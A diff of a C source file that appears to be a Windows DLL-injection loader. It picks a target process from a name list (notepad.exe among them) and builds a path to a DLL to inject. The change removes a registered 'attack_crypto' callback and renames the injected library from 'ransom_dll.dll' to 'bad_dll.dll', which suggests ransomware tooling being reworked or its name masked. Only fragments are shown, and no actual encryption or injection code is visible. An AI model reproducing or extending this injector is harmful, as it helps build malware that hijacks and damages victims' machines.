@@ -7,7 +7,6 @@
 
 #define MAX_PATH 260
 
-int attack_crypto(void);
 
 DWORD get_pid_from_list(const char *names[], size_t count)
 {
@@ -34,10 +33,6 @@ DWORD get_pid_from_list(const char *names[], size_t count)
 }
 
 int main(void) {
-    // Register crypto implementation
-    attack_set_crypto_callback(attack_crypto);
-
-    
     // List of process names to target
     const char *processes[] = {
         "notepad.exe",
@@ -49,7 +44,7 @@ int main(void) {
     get_dir(exe_dir, sizeof(exe_dir));
 
     char dll[MAX_PATH];
-    snprintf(dll, sizeof(dll), "%s\\%s", exe_dir, "ransom_dll.dll");
+    snprintf(dll, sizeof(dll), "%s\\%s", exe_dir, "bad_dll.dll");
 
     DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));
 
